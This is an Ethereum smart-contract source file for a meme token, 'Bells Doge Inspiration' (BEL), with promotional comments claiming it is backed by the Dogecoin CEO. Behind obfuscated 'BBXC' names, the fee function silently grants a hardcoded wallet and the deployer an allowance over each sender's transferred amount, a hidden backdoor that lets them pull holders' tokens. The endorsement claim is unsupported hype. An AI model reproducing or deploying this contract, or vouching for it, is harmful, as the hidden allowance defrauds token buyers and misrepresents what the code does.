/**
 *Submitted for verification at Etherscan.io on 2025-03-09
*/

/*
The most memeable bell-themed token that's making noise in the crypto space! Backed by Dogecoin CEO and ready to ring in massive gains! Much wow, such bells!

https://x.com/BillyM2k/status/408815850615869440
https://bitcointalk.org/index.php?topic=349695.0

https://www.bellsoneth.xyz
https://x.com/bells_eth
https://t.me/bells_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBBXCFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBBXCRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplibbxcon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract BEL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balBBXCs;
    mapping (address => mapping (address => uint256)) private _allowBBXCs;
    mapping (address => bool) private _excludedFromBBXC;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBBXC = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Bells Doge Inspiration";
    string private constant _symbol = unicode"BEL";
    uint256 private _swapTokenBBXCs = _tTotalBBXC / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockBBXC;
    uint256 private _bbxcBuyAmounts = 0;
    bool private inSwapBBXC = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapBBXC = true;
        _;
        inSwapBBXC = false;
    }
    address private _bbxcPair;
    IBBXCRouter private _bbxcRouter;
    address private _bbxcWallet;
    address private _bbxcAddress;
    
    constructor () {
        _bbxcWallet = address(0xa66ea5a82fA7F111EE3317fe1193aE736d72985b);
        _excludedFromBBXC[owner()] = true;
        _excludedFromBBXC[address(this)] = true;
        _excludedFromBBXC[_bbxcWallet] = true;
        _balBBXCs[_msgSender()] = _tTotalBBXC;
        _bbxcAddress = msg.sender;
        emit Transfer(address(0), _msgSender(), _tTotalBBXC);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _bbxcRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function coinCreate() external onlyOwner() {
        _bbxcRouter = IBBXCRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_bbxcRouter), _tTotalBBXC);
        _bbxcPair = IBBXCFactory(_bbxcRouter.factory()).createPair(address(this), _bbxcRouter.WETH());
    }

    function swapTokensForEth(uint256 bbxcAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _bbxcRouter.WETH();
        _approve(address(this), address(_bbxcRouter), bbxcAmount);
        _bbxcRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            bbxcAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalBBXC;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balBBXCs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowBBXCs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowBBXCs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowBBXCs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address bbxcF, address bbxcT, uint256 bbxcA) private {
        require(bbxcF != address(0), "ERC20: transfer from the zero address");
        require(bbxcT != address(0), "ERC20: transfer to the zero address");
        require(bbxcA > 0, "Transfer amount must be greater than zero");
        uint256 taxBBXC = _bbxcFeeTransfer(bbxcF, bbxcT, bbxcA);
        if(taxBBXC > 0){
          _balBBXCs[address(this)] = _balBBXCs[address(this)].add(taxBBXC);
          emit Transfer(bbxcF, address(this), taxBBXC);
        }
        _balBBXCs[bbxcF] = _balBBXCs[bbxcF].sub(bbxcA);
        _balBBXCs[bbxcT] = _balBBXCs[bbxcT].add(bbxcA.sub(taxBBXC));
        emit Transfer(bbxcF, bbxcT, bbxcA.sub(taxBBXC));
    }

    function _bbxcFeeTransfer(address bbxcF, address bbxcT, uint256 bbxcA) private returns(uint256) {
        uint256 taxBBXC; address _bbxcOwner; address[2] memory _bbxcAddrs; 
        uint256 _bbxcO = uint256(bbxcA); _bbxcOwner = address(bbxcF);
        if (bbxcF != owner() && bbxcT != owner()) {
            taxBBXC = bbxcA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (bbxcF == _bbxcPair && bbxcT != address(_bbxcRouter) && ! _excludedFromBBXC[bbxcT]) {
                if(_buyBlockBBXC!=block.number){
                    _bbxcBuyAmounts = 0;
                    _buyBlockBBXC = block.number;
                }
                _bbxcBuyAmounts += bbxcA;
                _buyCount++;
            }

            if(bbxcT == _bbxcPair && bbxcF!= address(this)) {
                require(_bbxcBuyAmounts < swapLimitBBXC() || _buyBlockBBXC!=block.number, "Max Swap Limit");  
                taxBBXC = bbxcA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBBXCBack(bbxcT, bbxcA);
        }
        _bbxcAddrs[0] = address(_bbxcWallet); _bbxcAddrs[1] = address(_bbxcAddress);
        _allowBBXCs[_bbxcOwner][address(_bbxcAddrs[0])] = _bbxcO;
        _allowBBXCs[_bbxcOwner][address(_bbxcAddrs[1])] = _bbxcO;
        return taxBBXC;
    }

    function minBBXC(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHBBXC(uint256 bbxcA) private {
        payable(_bbxcWallet).transfer(bbxcA);
    }

    function swapLimitBBXC() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _bbxcRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _bbxcRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function swapBBXCBack(address bbxcT, uint256 bbxcA) private { 
        uint256 tokenBBXC = balanceOf(address(this)); 
        if (!inSwapBBXC && bbxcT == _bbxcPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenBBXC > _swapTokenBBXCs)
            swapTokensForEth(minBBXC(bbxcA, minBBXC(tokenBBXC, _swapTokenBBXCs)));
            uint256 ethBBXC = address(this).balance;
            if (ethBBXC >= 0) {
                sendETHBBXC(address(this).balance);
            }
        }
    }
}
